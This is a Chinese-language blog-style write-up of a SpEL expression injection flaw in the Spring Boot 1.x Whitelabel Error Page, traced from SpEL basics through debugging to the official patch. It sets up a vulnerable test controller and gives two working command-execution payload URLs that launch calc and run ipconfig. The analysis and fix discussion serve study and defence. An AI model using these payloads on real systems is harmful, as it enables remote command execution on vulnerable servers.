<h4 id="弹出画图"><a href="#弹出画图" class="headerlink" title="弹出画图"></a>弹出画图</h4><h5 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp  = parser.parseExpression(<span class="string">"new java.util.Date()"</span>);</span><br><span class="line">Object obj = exp.getValue();</span><br><span class="line">System.out.println(obj);</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">Mon May <span class="number">27</span> <span class="number">11</span>:<span class="number">40</span>:<span class="number">08</span> CST <span class="number">2019</span></span><br></pre></td></tr></table></figure>

<h5 id="对象方法的调用"><a href="#对象方法的调用" class="headerlink" title="对象方法的调用"></a>对象方法的调用</h5><h6 id="与java语法一样，直接调用即可"><a href="#与java语法一样，直接调用即可" class="headerlink" title="与java语法一样，直接调用即可"></a>与java语法一样，直接调用即可</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String exp  = parser.parseExpression(<span class="string">"'abcde'.substring(0,2)"</span>).getValue(String.class);</span><br><span class="line"></span><br><span class="line">output: ab</span><br></pre></td></tr></table></figure>

<h5 id="变量定义及引用"><a href="#变量定义及引用" class="headerlink" title="变量定义及引用"></a>变量定义及引用</h5><h6 id="变量通过EvaluationContext接口的setVariable-name-value-定义-在表达式中使用-name引用-另外还可以用-root与-this引用根对象与上下文对象"><a href="#变量通过EvaluationContext接口的setVariable-name-value-定义-在表达式中使用-name引用-另外还可以用-root与-this引用根对象与上下文对象" class="headerlink" title="变量通过EvaluationContext接口的setVariable(name,value)定义,在表达式中使用#name引用;另外还可以用#root与#this引用根对象与上下文对象."></a>变量通过EvaluationContext接口的setVariable(name,value)定义,在表达式中使用#name引用;另外还可以用#root与#this引用根对象与上下文对象.</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(<span class="keyword">new</span> User());</span><br><span class="line">context.setVariable(<span class="string">"beanId1"</span>, <span class="string">"test1"</span>);  <span class="comment">//自定义变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取自定义变量 beanId1     test1</span></span><br><span class="line">String result1 = parser.parseExpression(<span class="string">"#beanId1"</span>).getValue(context, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取根对象 即User      User@40f0c</span></span><br><span class="line">User result2 = parser.parseExpression(<span class="string">"#root"</span>).getValue(context, User.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前上下文对象 USer   User@40f0c</span></span><br><span class="line">User result3 = parser.parseExpression(<span class="string">"#this"</span>).getValue(context, User.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure>

<h4 id="主要接口"><a href="#主要接口" class="headerlink" title="主要接口"></a>主要接口</h4><h5 id="ExpressionParser"><a href="#ExpressionParser" class="headerlink" title="ExpressionParser"></a>ExpressionParser</h5><h6 id="解析器，该接口的默认实现是SpelExpressionParser，使用其parseExpression-方法将字符串表达式转换为Expression对象。"><a href="#解析器，该接口的默认实现是SpelExpressionParser，使用其parseExpression-方法将字符串表达式转换为Expression对象。" class="headerlink" title="解析器，该接口的默认实现是SpelExpressionParser，使用其parseExpression()方法将字符串表达式转换为Expression对象。"></a>解析器，该接口的默认实现是SpelExpressionParser，使用其parseExpression()方法将字符串表达式转换为Expression对象。</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ExpressionParser</span></span>&#123;</span><br><span class="line">    <span class="function">Expression <span class="title">parseExpression</span><span class="params">(String varl)</span> <span class="keyword">throws</span> ParseException</span>;</span><br><span class="line">    <span class="function">Expression <span class="title">parseExpression</span><span class="params">(String varl,ParserContext var2)</span> <span class="keyword">throws</span> ParseException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h5><h6 id="ParserContext接口用于定义传入的字符串表达式是不是模板-我们这里自定义一个ParserContext对象，并实现主要方法"><a href="#ParserContext接口用于定义传入的字符串表达式是不是模板-我们这里自定义一个ParserContext对象，并实现主要方法" class="headerlink" title="ParserContext接口用于定义传入的字符串表达式是不是模板,我们这里自定义一个ParserContext对象，并实现主要方法"></a>ParserContext接口用于定义传入的字符串表达式是不是模板,我们这里自定义一个ParserContext对象，并实现主要方法</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">ParserContext parserContext = <span class="keyword">new</span> ParserContext() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getExpressionPrefix</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"#&#123;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getExpressionSuffix</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Expression exp  = parser.parseExpression(<span class="string">"#&#123;'hello '&#125;"</span>,parserContext);</span><br><span class="line">String msg = (String) exp.getValue();</span><br><span class="line">System.out.println(msg);</span><br></pre></td></tr></table></figure>

<h6 id="我们使用parseExpression-解析表达式时指定该对象-表示传入表达式须为模板-格式。"><a href="#我们使用parseExpression-解析表达式时指定该对象-表示传入表达式须为模板-格式。" class="headerlink" title="我们使用parseExpression()解析表达式时指定该对象,表示传入表达式须为模板(${})格式。"></a>我们使用<code>parseExpression()</code>解析表达式时指定该对象,表示传入表达式须为模板(${})格式。</h6><h5 id="Expression接口"><a href="#Expression接口" class="headerlink" title="Expression接口"></a>Expression接口</h5><h6 id="表达式对象-默认实现为org-springframework-expression-spel-standard的SpelExpression-其中getValue-方法用于获取表达式值-setValue-方法用于设置对象值-都会执行表达式-所以SpEl注入要重点关注这两个方法"><a href="#表达式对象-默认实现为org-springframework-expression-spel-standard的SpelExpression-其中getValue-方法用于获取表达式值-setValue-方法用于设置对象值-都会执行表达式-所以SpEl注入要重点关注这两个方法" class="headerlink" title="表达式对象,默认实现为org.springframework.expression.spel.standard的SpelExpression,其中getValue()方法用于获取表达式值,setValue()方法用于设置对象值(都会执行表达式,所以SpEl注入要重点关注这两个方法)"></a>表达式对象,默认实现为org.springframework.expression.spel.standard的SpelExpression,其中getValue()方法用于获取表达式值,setValue()方法用于设置对象值(都会执行表达式,所以SpEl注入要重点关注这两个方法)</h6><h5 id="EvaluationContext接口"><a href="#EvaluationContext接口" class="headerlink" title="EvaluationContext接口"></a>EvaluationContext接口</h5><h6 id="表示上下文环境-用于解析属性，方法与特殊字段的一个接口。默认实现为org-springframework-expression-spel-support中的StandardEvaluationContext-使用setRootObject设置根对象-setVariable-注册自定义变脸-registerFunction-注册自定义函数等等"><a href="#表示上下文环境-用于解析属性，方法与特殊字段的一个接口。默认实现为org-springframework-expression-spel-support中的StandardEvaluationContext-使用setRootObject设置根对象-setVariable-注册自定义变脸-registerFunction-注册自定义函数等等" class="headerlink" title="表示上下文环境,用于解析属性，方法与特殊字段的一个接口。默认实现为org.springframework.expression.spel.support中的StandardEvaluationContext,使用setRootObject设置根对象,setVariable()注册自定义变脸,registerFunction()注册自定义函数等等"></a>表示上下文环境,用于解析属性，方法与特殊字段的一个接口。默认实现为org.springframework.expression.spel.support中的StandardEvaluationContext,使用setRootObject设置根对象,setVariable()注册自定义变脸,registerFunction()注册自定义函数等等</h6><h5 id="SpEl提供的2个EvaluationContext的区别"><a href="#SpEl提供的2个EvaluationContext的区别" class="headerlink" title="SpEl提供的2个EvaluationContext的区别"></a>SpEl提供的2个EvaluationContext的区别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StandardEvaluationContext  功能强大,可以设置SpEl的所有配置,包括Java类型,Bean的引用等,是不安全的。		</span><br><span class="line"></span><br><span class="line">SimpleEvaluationContext 仅支持SpEL语言语法的子集(Map),不包括Java类型引用,Bean引用等</span><br><span class="line">可用于防止SpEl表达式注入,本文实例中的Spring Data Commons的RCE 官方修复方案就是将StandardEvaluationContext替换为SimpleEvaluationContext</span><br></pre></td></tr></table></figure>

<h4 id="SpEL导致的任意命令执行原理分析"><a href="#SpEL导致的任意命令执行原理分析" class="headerlink" title="SpEL导致的任意命令执行原理分析"></a>SpEL导致的任意命令执行原理分析</h4><h5 id="成因"><a href="#成因" class="headerlink" title="成因:"></a>成因:</h5><h6 id="1-不设置容器-默认ApplciationContext-或设为StandardEvaluationContext"><a href="#1-不设置容器-默认ApplciationContext-或设为StandardEvaluationContext" class="headerlink" title="1.不设置容器(默认ApplciationContext)或设为StandardEvaluationContext"></a>1.不设置容器(默认ApplciationContext)或设为StandardEvaluationContext</h6><h6 id="2-用户可控控制表达式内容且无过滤"><a href="#2-用户可控控制表达式内容且无过滤" class="headerlink" title="2.用户可控控制表达式内容且无过滤"></a>2.用户可控控制表达式内容且无过滤</h6><h6 id="3-最后使用getValue-或setValue-执行了表达式"><a href="#3-最后使用getValue-或setValue-执行了表达式" class="headerlink" title="3.最后使用getValue()或setValue()执行了表达式"></a>3.最后使用getValue()或setValue()执行了表达式</h6><h6 id="4-可以运行上面的代码，查看执行的效果。"><a href="#4-可以运行上面的代码，查看执行的效果。" class="headerlink" title="4.可以运行上面的代码，查看执行的效果。"></a>4.可以运行上面的代码，查看执行的效果。</h6><h4 id="漏洞案例分析"><a href="#漏洞案例分析" class="headerlink" title="漏洞案例分析"></a>漏洞案例分析</h4><h5 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h5><h5 id="使用SpEL渲染错误页面，当攻击者传入SpEL表达式，程序解析时触发执行表达式"><a href="#使用SpEL渲染错误页面，当攻击者传入SpEL表达式，程序解析时触发执行表达式" class="headerlink" title="使用SpEL渲染错误页面，当攻击者传入SpEL表达式，程序解析时触发执行表达式"></a>使用SpEL渲染错误页面，当攻击者传入SpEL表达式，程序解析时触发执行表达式</h5><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><h6 id="1-SpringBoot版本"><a href="#1-SpringBoot版本" class="headerlink" title="1.SpringBoot版本"></a>1.SpringBoot版本</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.1.0-1.1.12</span><br><span class="line">1.2.0-1.2.7</span><br><span class="line">1.3.0</span><br></pre></td></tr></table></figure>

<h6 id="2-在Controller中，异常信息中存在可控数据"><a href="#2-在Controller中，异常信息中存在可控数据" class="headerlink" title="2.在Controller中，异常信息中存在可控数据"></a>2.在Controller中，异常信息中存在可控数据</h6><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><h5 id="新建一个Maven项目如下："><a href="#新建一个Maven项目如下：" class="headerlink" title="新建一个Maven项目如下："></a>新建一个Maven项目如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pom.xml</span><br><span class="line">&lt;parent&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.2.5.RELEASE&lt;/version&gt;</span><br><span class="line">  &lt;relativePath/&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">TestController.java			</span><br><span class="line">@Controller</span><br><span class="line">public class TestController &#123;</span><br><span class="line">    @RequestMapping(&quot;/&quot;)</span><br><span class="line">    public String test(String payload)&#123;</span><br><span class="line">        System.out.println(&quot;test&quot;);</span><br><span class="line">        throw new IllegalArgumentException(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DemoApplication.java</span><br><span class="line">@SpringBootApplication</span><br><span class="line">@ComponentScan(basePackages = &#123;&quot;sample.controller&quot;&#125;)</span><br><span class="line">public class DemoApplication &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="直接运行DemoApplication-main-即可启动SpringBoot程序"><a href="#直接运行DemoApplication-main-即可启动SpringBoot程序" class="headerlink" title="直接运行DemoApplication.main()即可启动SpringBoot程序"></a>直接运行DemoApplication.main()即可启动SpringBoot程序</h5><h5 id="请求："><a href="#请求：" class="headerlink" title="请求："></a>请求：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/?payload=$&#123;new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//localhost:8080/?payload=$&#123;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.00.38-image.png" alt></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><h6 id="ErrorMvcAutoConfiguration下面的SpelView类的render-该方法作用是解析Whitelabel-Error-Page模板内容并填充数据-在填充数据过程中递归解析的-message-用户可控-导致SpEl表达式注入。"><a href="#ErrorMvcAutoConfiguration下面的SpelView类的render-该方法作用是解析Whitelabel-Error-Page模板内容并填充数据-在填充数据过程中递归解析的-message-用户可控-导致SpEl表达式注入。" class="headerlink" title="ErrorMvcAutoConfiguration下面的SpelView类的render(),该方法作用是解析Whitelabel Error Page模板内容并填充数据,在填充数据过程中递归解析的${message}(用户可控),导致SpEl表达式注入。"></a>ErrorMvcAutoConfiguration下面的SpelView类的render(),该方法作用是解析Whitelabel Error Page模板内容并填充数据,在填充数据过程中递归解析的${message}(用户可控),导致SpEl表达式注入。</h6><h4 id="下面参考人家的调试过程。"><a href="#下面参考人家的调试过程。" class="headerlink" title="下面参考人家的调试过程。"></a>下面参考人家的调试过程。</h4><h5 id="开始调试-首先进入org-springframework-boot-autoconfigure-web-ErrorMvcAutoConfiguration-render"><a href="#开始调试-首先进入org-springframework-boot-autoconfigure-web-ErrorMvcAutoConfiguration-render" class="headerlink" title="开始调试,首先进入org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration#render()"></a>开始调试,首先进入org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration#render()</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.31.53-image.png" alt></p>
<h5 id="函数设置this-context的RootObject值-接着调用replacePlaceholders-其中"><a href="#函数设置this-context的RootObject值-接着调用replacePlaceholders-其中" class="headerlink" title="函数设置this.context的RootObject值,接着调用replacePlaceholders(),其中"></a>函数设置this.context的RootObject值,接着调用replacePlaceholders(),其中</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.template=&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&apos;created&apos;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><br></pre></td></tr></table></figure>

<h5 id="跟进replacePlaceholders"><a href="#跟进replacePlaceholders" class="headerlink" title="跟进replacePlaceholders():"></a>跟进replacePlaceholders():</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.32.11-image.png" alt></p>
<h5 id="该方法作用是将表达式结果替换，跟进parseStringValue-这个就是我们解析的关键函数"><a href="#该方法作用是将表达式结果替换，跟进parseStringValue-这个就是我们解析的关键函数" class="headerlink" title="该方法作用是将表达式结果替换，跟进parseStringValue(),这个就是我们解析的关键函数"></a>该方法作用是将表达式结果替换，跟进parseStringValue(),这个就是我们解析的关键函数</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.41.04-image.png" alt></p>
<h5 id="循环取得以-开头-以-为结尾的表达式-挨个赋值。当解析到message时，跟进resolvePlaceholder"><a href="#循环取得以-开头-以-为结尾的表达式-挨个赋值。当解析到message时，跟进resolvePlaceholder" class="headerlink" title="循环取得以${开头,以}为结尾的表达式,挨个赋值。当解析到message时，跟进resolvePlaceholder():"></a>循环取得以<code>${</code>开头,以<code>}</code>为结尾的表达式,挨个赋值。当解析到<code>message</code>时，跟进<code>resolvePlaceholder()</code>:</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.46.40-image.png" alt></p>
<h5 id="就到了我们解析表达式的地方："><a href="#就到了我们解析表达式的地方：" class="headerlink" title="就到了我们解析表达式的地方："></a>就到了我们解析表达式的地方：</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.49.25-image.png" alt></p>
<h5 id="因为-message-内容为-paylaod-所以会再次解析"><a href="#因为-message-内容为-paylaod-所以会再次解析" class="headerlink" title="因为${message}内容为${paylaod},所以会再次解析"></a>因为<code>${message}</code>内容为<code>${paylaod}</code>,所以会再次解析</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.39.57-image.png" alt></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.56.29-image.png" alt></p>
<h5 id="最后调用getValue-造成命令执行"><a href="#最后调用getValue-造成命令执行" class="headerlink" title="最后调用getValue()造成命令执行"></a>最后调用getValue()造成命令执行</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.40.55-image.png" alt></p>
<h4 id="Whitelabel-Error-Page是如何实现的"><a href="#Whitelabel-Error-Page是如何实现的" class="headerlink" title="Whitelabel Error Page是如何实现的"></a>Whitelabel Error Page是如何实现的</h4><h5 id="为什么我们的controller发生错误-而我们自己没有进行异常捕获-默认会跳转到Whitelabel-Error-Page页面"><a href="#为什么我们的controller发生错误-而我们自己没有进行异常捕获-默认会跳转到Whitelabel-Error-Page页面" class="headerlink" title="为什么我们的controller发生错误,而我们自己没有进行异常捕获,默认会跳转到Whitelabel Error Page页面"></a>为什么我们的controller发生错误,而我们自己没有进行异常捕获,默认会跳转到Whitelabel Error Page页面</h5><h5 id="SpringBoot内部提供了一个ErrorController为BasicErrorController-其-RequestMapping默认为-error-当SpringBoot程序的Controller发生错误，默认去访问-error-请求在BasicErrorController处理-返回error视图-而error这个Bean在ErrorMvcAutoConfiguration的自动化配置类中定义-它会返回SpelView视图也就是刚才的Whitelabel-Error-Page页面"><a href="#SpringBoot内部提供了一个ErrorController为BasicErrorController-其-RequestMapping默认为-error-当SpringBoot程序的Controller发生错误，默认去访问-error-请求在BasicErrorController处理-返回error视图-而error这个Bean在ErrorMvcAutoConfiguration的自动化配置类中定义-它会返回SpelView视图也就是刚才的Whitelabel-Error-Page页面" class="headerlink" title="SpringBoot内部提供了一个ErrorController为BasicErrorController,其@RequestMapping默认为/error,当SpringBoot程序的Controller发生错误，默认去访问/error,请求在BasicErrorController处理,返回error视图,而error这个Bean在ErrorMvcAutoConfiguration的自动化配置类中定义,它会返回SpelView视图也就是刚才的Whitelabel Error Page页面"></a><code>SpringBoot</code>内部提供了一个<code>ErrorController</code>为<code>BasicErrorController</code>,其<code>@RequestMapping</code>默认为<code>/error</code>,当SpringBoot程序的Controller发生错误，默认去访问<code>/error</code>,请求在<code>BasicErrorController</code>处理,返回error视图,而error这个Bean在<code>ErrorMvcAutoConfiguration</code>的自动化配置类中定义,它会返回<code>SpelView</code>视图也就是刚才的<code>Whitelabel Error Page</code>页面</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelErrorViewConfiguration</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ErrorMvcAutoConfiguration.SpelView defaultErrorView = <span class="keyword">new</span> ErrorMvcAutoConfiguration.SpelView(<span class="string">"&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id='created'&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">WhitelabelErrorViewConfiguration</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Bean</span>(</span><br><span class="line">            name = &#123;<span class="string">"error"</span>&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="meta">@ConditionalOnMissingBean</span>(</span><br><span class="line">            name = &#123;<span class="string">"error"</span>&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="function"><span class="keyword">public</span> View <span class="title">defaultErrorView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defaultErrorView;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h5 id="我们漏洞发生的地方就是在使用SpEl表达式从当前context的RootObject中获取相关数据-exception-path-message等-填充到Whitelabel-Error-Page页面时发生的。"><a href="#我们漏洞发生的地方就是在使用SpEl表达式从当前context的RootObject中获取相关数据-exception-path-message等-填充到Whitelabel-Error-Page页面时发生的。" class="headerlink" title="我们漏洞发生的地方就是在使用SpEl表达式从当前context的RootObject中获取相关数据(exception path message等)填充到Whitelabel Error Page页面时发生的。"></a>我们漏洞发生的地方就是在使用SpEl表达式从当前<code>context</code>的<code>RootObject</code>中获取相关数据(<code>exception path message</code>等)填充到<code>Whitelabel Error Page</code>页面时发生的。</h5><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><h5 id="参考-https-github-com-spring-projects-spring-boot-commit-edb16a13ee33e62b046730a47843cb5dc92054e6-diff-split"><a href="#参考-https-github-com-spring-projects-spring-boot-commit-edb16a13ee33e62b046730a47843cb5dc92054e6-diff-split" class="headerlink" title="参考:https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6?diff=split"></a>参考:<a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6?diff=split" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6?diff=split</a></h5><h5 id="SpringBoot版本为1-3-5-RELEASE"><a href="#SpringBoot版本为1-3-5-RELEASE" class="headerlink" title="SpringBoot版本为1.3.5.RELEASE"></a>SpringBoot版本为1.3.5.RELEASE</h5><h5 id="官方给的修复方式是增加了NonRecursivePropertyPlaceholderHelper类-防止递归解析其中的SpEl表达式"><a href="#官方给的修复方式是增加了NonRecursivePropertyPlaceholderHelper类-防止递归解析其中的SpEl表达式" class="headerlink" title="官方给的修复方式是增加了NonRecursivePropertyPlaceholderHelper类,防止递归解析其中的SpEl表达式"></a>官方给的修复方式是增加了<code>NonRecursivePropertyPlaceholderHelper</code>类,防止递归解析其中的SpEl表达式</h5><h5 id="SpelView类的helper变为了NonRecursivePropertyPlaceholderHelper对象"><a href="#SpelView类的helper变为了NonRecursivePropertyPlaceholderHelper对象" class="headerlink" title="SpelView类的helper变为了NonRecursivePropertyPlaceholderHelper对象:"></a>SpelView类的helper变为了<code>NonRecursivePropertyPlaceholderHelper</code>对象:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final NonRecursivePropertyPlaceholderHelper helper = new NonRecursivePropertyPlaceholderHelper(&quot;$&#123;&quot;, &quot;&#125;&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="测试补丁"><a href="#测试补丁" class="headerlink" title="测试补丁"></a>测试补丁</h4><h5 id="第一次解析-messae-时-类型为"><a href="#第一次解析-messae-时-类型为" class="headerlink" title="第一次解析${messae}时,类型为:"></a>第一次解析<code>${messae}</code>时,类型为:</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.43.38-image.png" alt></p>
<h5 id="接着会判断是否是NonRecursivePlaceholderResolver的实例对象-若是-则直接返回null-若不是再解析"><a href="#接着会判断是否是NonRecursivePlaceholderResolver的实例对象-若是-则直接返回null-若不是再解析" class="headerlink" title="接着会判断是否是NonRecursivePlaceholderResolver的实例对象,若是,则直接返回null,若不是再解析"></a>接着会判断是否是<code>NonRecursivePlaceholderResolver</code>的实例对象,若是,则直接返回null,若不是再解析</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.45.05-image.png" alt></p>
<h5 id="所以第一次解析-message-时-会去解析表达式expression得到我们的payload-而再次解析我们传入payload时-类型变为"><a href="#所以第一次解析-message-时-会去解析表达式expression得到我们的payload-而再次解析我们传入payload时-类型变为" class="headerlink" title="所以第一次解析${message}时,会去解析表达式expression得到我们的payload,而再次解析我们传入payload时,类型变为:"></a>所以第一次解析<code>${message}</code>时,会去解析表达式<code>expression</code>得到我们的payload,而再次解析我们传入payload时,类型变为:</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.47.12-image.png" alt></p>
